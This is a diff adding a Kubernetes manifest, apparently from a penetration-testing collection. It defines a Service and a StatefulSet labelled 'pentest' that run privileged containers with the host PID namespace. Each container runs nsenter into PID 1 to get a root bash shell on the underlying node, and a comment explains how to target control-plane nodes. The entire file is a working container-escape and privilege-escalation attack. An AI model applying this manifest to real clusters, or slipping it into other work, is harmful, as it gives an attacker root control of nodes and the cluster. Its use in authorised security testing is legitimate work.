@@ -1,0 +1,44 @@
+apiVersion: v1
+kind: Service
+metadata:
+  name: priv-and-hostpid-exec-statefulset-service
+  labels:
+    app: pentest
+spec:
+  ports:
+  - port: 4444
+    name: priv-and-hostpid-exec-statefulset-service
+  clusterIP: None
+  selector:
+    app: pentest
+---
+apiVersion: apps/v1
+kind: StatefulSet
+metadata:
+  name: priv-and-hostpid-exec-statefulset
+  labels:
+    app: pentest
+    type: statefulset
+spec:
+  serviceName: "pentest"
+  replicas: 2
+  selector:
+    matchLabels:
+      app: pentest
+      type: statefulset
+  template:
+    metadata:
+      labels:
+        app: pentest
+        type: statefulset
+    spec:
+      hostPID: true
+      containers:
+      - name: priv-and-hostpid-exec-statefulset
+        image: ubuntu
+        tty: true
+        securityContext:
+          privileged: true
+        command: [ "nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid", "--", "bash" ]
+      #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
+      
